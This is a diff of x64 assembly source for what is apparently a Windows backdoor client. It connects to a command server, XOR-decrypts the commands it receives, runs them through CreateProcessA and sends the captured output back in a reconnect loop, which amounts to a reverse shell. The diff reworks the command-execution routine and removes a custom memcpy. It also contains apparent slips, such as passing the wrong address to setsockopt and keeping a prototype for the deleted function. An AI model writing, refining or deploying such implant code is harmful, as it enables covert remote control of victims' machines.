@@ -9,6 +9,7 @@ include ..\include\winsock.inc
 include ..\include\ntdll.inc
 
 status_failure  equ 0xffffffff
+status_success  equ 0
 
 ; Shellcode commands
 buffer_size     equ 1024
@@ -21,13 +22,13 @@ cmd_exit        equ 1000b
 ; Function prototypes
 memcpy      proto   fastcall :qword, :qword, :dword
 xor_cipher  proto   fastcall :qword, :byte, :dword
-system_exec proto   fastcall :qword
+system_exec proto   fastcall :qword, :qword
 
 _data$00 segment page 'data'
     g_command_ip        db "127.0.0.1", 0
     g_command_port      dw 1664
-    timeout             timeval <>
-    g_timeout           dw 5
+    g_timeout             timeval <>
+    g_timeout_sec       dw 5
     g_timeout_usec      dw 0
 _data$00 ends
 
@@ -35,6 +36,7 @@ _text$00 segment align(10h) 'code'
 
     main proc
         local socket_buffer[buffer_size]:byte
+        local output_buffer[buffer_size]:byte
         local wsa_data:wsadata
         local sock_addr:sockaddr_in
         local dw_socket:dword
@@ -61,11 +63,11 @@ _text$00 segment align(10h) 'code'
         mov sock_addr.sin_port, ax
 
         ; Set receive timeout
-        mov ax, g_timeout
-        mov timeout.tv_sec, ax
+        mov ax, g_timeout_sec
+        mov g_timeout.tv_sec, ax
         mov ax, g_timeout_usec
-        mov timeout.tv_usec, ax
-        invoke setsockopt, dw_socket, sol_socket, so_rcvtimeo, addr timeout, sizeof timeval
+        mov g_timeout.tv_usec, ax
+        invoke setsockopt, dw_socket, sol_socket, so_rcvtimeo, addr g_timeout_sec, sizeof timeval
         cmp eax, socket_error
         je _exit
 
@@ -148,13 +150,13 @@ _text$00 segment align(10h) 'code'
             invoke xor_cipher, addr socket_buffer, cipher_key, buffer_size
 
             ; Run the supplied command 
-            invoke system_exec, addr socket_buffer
-            .if eax == status_failure || eax == 0
+            invoke system_exec, addr socket_buffer, addr output_buffer
+            .if eax == status_failure
                 .continue
             .endif
             
             ; Return the result
-            invoke send, dw_socket, addr socket_buffer, eax, 0
+            invoke send, dw_socket, addr output_buffer, eax, 0
             .continue
         .endw
         jmp _reconnect
@@ -184,110 +186,101 @@ _text$00 segment align(10h) 'code'
         ret
     xor_cipher endp
 
-    system_exec proc fastcall uses r8, command_buffer:qword
-            local pipe_buffer[buffer_size]:byte
-            local startup_info:startupinfoa
-            local process_info:process_information
-            local sec_attributes:security_attributes
-            local read_pipe:qword
-            local write_pipe:qword
-            local bytes_read:dword
-            local status:sword
-            ; Initialize process info handles to invalid values (for checks in _error)
-            mov process_info.hThread, -1
-            mov process_info.hProcess, -1
+    system_exec proc fastcall, system_exec_buffer:qword, out_buffer:qword
+        local pipe_buffer[buffer_size]:byte
+        local s_info:startupinfoa
+        local p_info:process_information
+        local sa:security_attributes
+        local h_stdout_write:qword
+        local h_stdout_read:qword
+        local bytes_read:dword
+        local status:dword
 
-            ; Initialize the local structures to zero
-            invoke RtlZeroMemory, addr startup_info, sizeof startup_info
-            invoke RtlZeroMemory, addr process_info, sizeof process_info
-            invoke RtlZeroMemory, addr sec_attributes, sizeof sec_attributes
+        invoke RtlZeroMemory, addr s_info, sizeof startupinfoa
+        invoke RtlZeroMemory, addr p_info, sizeof process_information
+        invoke RtlZeroMemory, addr sa, 0x18
+        invoke RtlZeroMemory, addr pipe_buffer, buffer_size
+        
+        ; Setup security attributes struct
+        mov sa.nLength, 0x18
+        mov sa.lpSecurityDescriptor, 0
+        mov sa.bInheritHandle, 1
 
-            ; Set security attributes to allow handle inheritance
-            mov sec_attributes.nLength, sizeof sec_attributes
-            mov sec_attributes.bInheritHandles, 1
-            mov sec_attributes.lpSecurityDescriptor, 0
+        ; Create a pipe for the child process's STDOUT
+        invoke CreatePipe, addr h_stdout_read, addr h_stdout_write, addr sa, 0
+        test eax, eax
+        jz _error
 
-            ; Create pipes for standard output and error redirection
-            invoke CreatePipe, addr read_pipe, addr write_pipe, addr sec_attributes, 0
-            test eax, eax
-            jz _error
+        ; Ensure the read handle is not inherited
+        invoke SetHandleInformation, h_stdout_read, handle_flag_inherit, 0
+        test eax, eax
+        jz _error
 
-            ; Ensure the write handle to the pipe for STDOUT is not inherited
-            invoke SetHandleInformation, write_pipe, handle_flag_inherit, 0
+        ; Setup the startup information strucet
+        mov rax, h_stdout_write
+        mov s_info.cbSize, sizeof startupinfoa
+        mov s_info.hStdError, rax
+        mov s_info.hStdOutput, rax
+        invoke GetStdHandle, std_input_handle
+        mov s_info.hStdInput, rax
+        mov s_info.dwFlags, startf_usestdhandles
+        
+        ; Ensure the buffer is null-terminated
+        mov rcx, system_exec_buffer
+        add rcx, buffer_size -1
+        mov byte ptr [rcx], 0
 
-            ; Prepare startupinfo structure
-            mov startup_info.cbsize, sizeof startupinfoa
-            mov startup_info.dwflags, startf_usestdhandles or startf_useshowwindow
-            mov startup_info.wShowWindow, sw_hide
-            mov rax, [read_pipe]
-            mov startup_info.hStdOutput, rax
-            mov rax, [write_pipe]
-            mov startup_info.hStdError, rax
+        ; Spawn the child process
+        invoke CreateProcessA, 0, system_exec_buffer, 0, 0, 1, 0, 0, 0, addr s_info, addr p_info
+        .if eax == 0
+            jmp _error
+        .endif
 
-            ; Create the process
-            invoke CreateProcessA, 0, command_buffer, 0, 0, 0, 0, 0, 0, addr startup_info, addr process_info
-            test eax, eax
-            je _error
-            invoke RtlZeroMemory, addr command_buffer, buffer_size
+        ; Close the write end of the pipe before reading from the read end
+        invoke CloseHandle, h_stdout_write
+        .if eax == 0
+            jmp _error
+        .endif
 
-            ; Close the write end of the pipe before reading from the read end
-            invoke CloseHandle, write_pipe
-            mov write_pipe, 0
+        ; Read the process output
+        ; Note: This only handles the first 1024 bytes
+        invoke ReadFile, h_stdout_read, addr pipe_buffer, buffer_size - 1, addr bytes_read, 0
+        .if eax == 0
+            invoke GetLastError
+            cmp eax, error_handle_eof
+            je _done_reading
+            jmp _error
+        _done_reading:
+            jmp _success
+        .endif
 
-            ; Read the output from the child process
-            .while 1
-                invoke RtlZeroMemory, addr pipe_buffer, buffer_size
-                invoke ReadFile, read_pipe, addr pipe_buffer, buffer_size -1, addr bytes_read, 0
-                test eax, eax
-                jz _error
-                invoke memcpy, addr command_buffer, pipe_buffer, buffer_size
-                mov eax, dword ptr [bytes_read]
-                mov dword ptr [status], eax
-                jmp _exit
-            .endw
+        mov eax, bytes_read
+        mov dword ptr [status], eax
+        invoke RtlCopyMemory, out_buffer, addr pipe_buffer, bytes_read
+
+        ; Wait for the child process to exit
+        invoke WaitForSingleObject, p_info.hProcess, infinite
+
+        _success:
+            mov eax, bytes_read
+            mov dword ptr [status], eax
+            jmp _exit
         _error:
             mov dword ptr [status], status_failure
         _exit:
-            ; If the handles are open, close them
-            .if process_info.hProcess != -1 && process_info.hProcess != 0
-                invoke CloseHandle, process_info.hProcess
+            .if p_info.hProcess != -1 && p_info.hProcess != 0
+                invoke CloseHandle, p_info.hProcess
             .endif
-            .if process_info.hThread != -1 && process_info.hThread != 0
-                invoke CloseHandle, process_info.hThread
+            .if p_info.hThread != -1 && p_info.hThread != 0
+                invoke CloseHandle, p_info.hThread
             .endif
-            .if write_pipe != -1 && write_pipe != 0
-                invoke CloseHandle, write_pipe
-            .endif
-            .if read_pipe != -1 && read_pipe != 0
-                invoke CloseHandle, read_pipe
+            .if h_stdout_read != -1 && h_stdout_read != 0
+                invoke CloseHandle, h_stdout_read
             .endif
 
             mov eax, dword ptr [status]
             ret
     system_exec endp
-
-    memcpy proc fastcall uses rdi rsi, dest:ptr, src:ptr, count:dword
-        ; Load the parameters into the appropriate registers
-        mov rdi, rcx       ; rdi <- dest
-        mov rsi, rdx       ; rsi <- src
-        mov ecx, r8d       ; rcx <- count (number of bytes to copy)
-
-        ; Check if there's anything to copy
-        test ecx, ecx
-        jz done            ; If count is zero, exit
-
-        ; Copy bytes from src to dest
-    copy_loop:
-        mov al, [rsi]      ; Load byte from source
-        mov [rdi], al      ; Store byte in destination
-        inc rsi            ; Increment source pointer
-        inc rdi            ; Increment destination pointer
-        dec ecx            ; Decrement byte count
-        jnz copy_loop      ; Repeat if there are more bytes to copy
-
-    done:
-        ret                ; Return to caller
-    memcpy endp
 
 _text$00 ends
 
